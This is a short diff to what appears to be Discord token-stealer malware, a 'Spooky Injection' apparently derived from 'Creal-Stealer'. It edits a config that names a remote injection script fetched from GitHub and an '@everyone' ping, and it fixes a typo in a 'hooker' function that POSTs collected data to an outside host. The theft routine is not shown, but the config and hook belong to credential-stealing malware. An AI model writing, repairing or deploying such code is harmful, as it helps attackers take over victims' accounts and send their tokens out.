@@ -12,7 +12,7 @@ const config = {
   ping_on_run: true, 
   ping_val: '@everyone',
   embed_name: 'Spooky Injection', 
-  embed_icon: 'https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg'.replace(/ /g, '%20'), 
+  embed_icon: 'https://raw.githubusercontent.com/0x421/injection/main/png/spooky.jpg'.replace(/ /g, '%20'), 
   embed_color: 2895667, 
   injection_url: 'https://raw.githubusercontent.com/0x421/injection/main/index.js', 
   /**
@@ -633,7 +633,7 @@ const hooker = async (content) => {
   }
   const options = {
     protocol: url.protocol,
-    hostname: url.host,c
+    hostname: url.host,
     path: url.pathname,
     method: 'POST',
     headers: headers,
